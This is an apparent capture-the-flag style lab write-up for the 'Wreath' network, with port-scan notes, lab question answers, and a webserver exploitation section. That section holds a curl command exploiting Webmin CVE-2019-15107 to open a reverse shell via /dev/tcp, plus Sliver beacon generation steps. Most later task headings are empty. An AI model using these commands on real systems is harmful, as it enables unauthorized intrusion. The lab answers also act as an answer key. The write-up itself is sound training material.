# Wreath Writeup

![](mugshot.png)

Name: Wreath
Date:  
Difficulty:  
Goals:  
- Masscan does miss - Check on the naabu / rustscan alternative question again 
Learnt:
Beyond Root:

- [[Wreath-Notes.md]]
- [[Wreath-CMD-by-CMDs.md]]
- [[Wreath-Penetration-Test-Report]]

![](Wreath-map.excalidraw.md)

##

#### Lab Scope

`toolname-username` - Shared network naming conventions

#### Brief

*There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*
## Webserver Enumeration

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Masscan missed the top 10000 plus port once on 300 rate and on 100 rate... I miss read that 

nikto - found redirect https://thomaswreath.thm

![](10000vuln.png)

![](renmapscananotherport.png)

Nuclei find open redirect to a weird domain... 
`[open-redirect] [http] [medium] http://10.200.96.200/.evil.com [redirect=".evil.com"]`

Mr Wreath is backdoored - this should not resolve
![](backdooredman.png)

`mx.evil.com`  is mail server DNS recond also found by Nuclei the `thomaswreath.thm.evil.com`

[[CVE-2018-11784-http___10.200.96.200__interact.sh]]

![](stillcantfindthatplus15kport.png)

![](poorladisfromyorkshire.png)

#### Task 5 Webserver Enumeration

How many of the first 15000 ports are open on the target?
```
5
```
What OS does Nmap think is running?
```
centos
```

What site does the server try to redirect you to?
```
https://thomaswreath.thm
```

What is Thomas' mobile phone number?

![](verydoxable.png)

```
+447821548812
```

What server version does Nmap detect as running here?
```
MiniServ 1.890 (Webmin httpd)
```

What is the CVE number for this exploit?
```
CVE-2019-15107
```

## Webserver Exploitation

I am prepared doing this machine and do not need to learn Empire or Chisel (just revising chisel) and will use Silver instead.

```go
generate beacon --mtls 10.50.76.121:2222 --arch amd64 --os linux --save /home/kali/Wreath/
mtls -L 10.50.76.121  -l 2222

// In Directory pack to reduce file size
upx WIDE-EYED_TRAM

```


[Exploit DB for Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)](https://www.exploit-db.com/exploits/47230), because OSCP's one Metasploit usage on one machine   

![](foxsincodeexplained.png)

So we do need to worry about python virtual environments for compatibility
```bash
curl  -k https://10.200.96.200:10000/password_change.cgi -d 'user=gotroot&pam=&expired=2|echo ""; bash -i >& /dev/tcp/10.50.76.121/10000 0>&1' -H 'Referer: https://10.200.96.200:10000/session_login.cgi'
```

Muirland also has an exploit to use - a better way to do this would be to create a virtual environment
```bash
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 
python3 -m venv .venv
source .venv/bin/activate

pip3 install .
```



#### Task 6 Webserver Exploitation

#### Task 7 Pivoting What is Pivoting?

#### Task 8 Pivoting High-level Overview

#### Task 9 Pivoting Enumeration

#### Task 10 Pivoting Proxychains & Foxyproxy

#### Task 11 Pivoting SSH Tunnelling / Port Forwarding

#### Task 12 Pivoting plink.exe

#### Task 13 Pivoting Socat

#### Task 14 Pivoting Chisel

#### Task 15 Pivoting sshuttle

#### Task 16 Pivoting Conclusion

#### Task 17 Git Server Enumeration

#### Task 18 Git Server Pivoting

#### Task 19 Git Server Code Review

#### Task 20 Git Server Exploitation

#### Task 21 Git Server Stabilisation & Post Exploitation


## C2 Choices Diverge...

From this point I will use silver instead of PowerShell Empire.

#### Task 22 Command and Control Introduction

#### Task 23 Command and Control Empire: Installation

#### Task 24 Command and Control Empire: Overview

#### Task 25 Command and Control Empire: Listeners

#### Task 26 Command and Control Empire: Stagers

#### Task 27 Command and Control Empire: Agents

#### Task 28 Command and Control Empire: Hop Listeners

#### Task 29 Command and Control Git Server

#### Task 30 Command and Control Empire: Modules

#### Task 31 Command and Control Empire: Interactive Shell

#### Task 32 Command and Control Conclusion

#### Task 33 Personal PC Enumeration

#### Task 34 Personal PC Pivoting

#### Task 35 Personal PC The Wonders of Git

#### Task 36 Personal PC Website Code Analysis

#### Task 37 Personal PC Exploit PoC

#### Task 38 AV Evasion Introduction

#### Task 39 AV Evasion AV Detection Methods

#### Task 40 AV Evasion PHP Payload Obfuscation

#### Task 41 AV Evasion Compiling Netcat & Reverse Shell!

#### Task 42 AV Evasion Enumeration

#### Task 43 AV Evasion Privilege Escalation

#### Task 44 Exfiltration Exfiltration Techniques & Post Exploitation

#### Task 45 Conclusion Debrief & Report

